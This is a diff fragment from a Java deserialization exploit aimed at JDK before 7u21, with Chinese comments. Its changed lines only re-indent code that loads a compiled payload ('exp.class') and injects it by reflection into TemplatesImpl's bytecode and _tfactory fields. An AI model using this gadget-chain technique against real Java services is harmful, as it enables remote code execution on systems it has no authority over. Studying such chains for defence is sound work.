@@ -74,12 +74,12 @@ jdk < 7u21
 //        byte[] code=remoteFileBytes;
 
         //读取本地文件
-        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
-        byte[][] codes={code};
-        bytecodefield.set(templates,codes);
-        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
-        tfactoryField.setAccessible(true);
-        tfactoryField.set(templates,new TransformerFactoryImpl());
+            byte[] code = Files.readAllBytes(Paths.get("exp.class"));
+            byte[][] codes={code};
+            bytecodefield.set(templates,codes);
+            Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
+            tfactoryField.setAccessible(true);
+            tfactoryField.set(templates,new TransformerFactoryImpl());
 
 
         //使用Template，TrAXFilter中newtranform
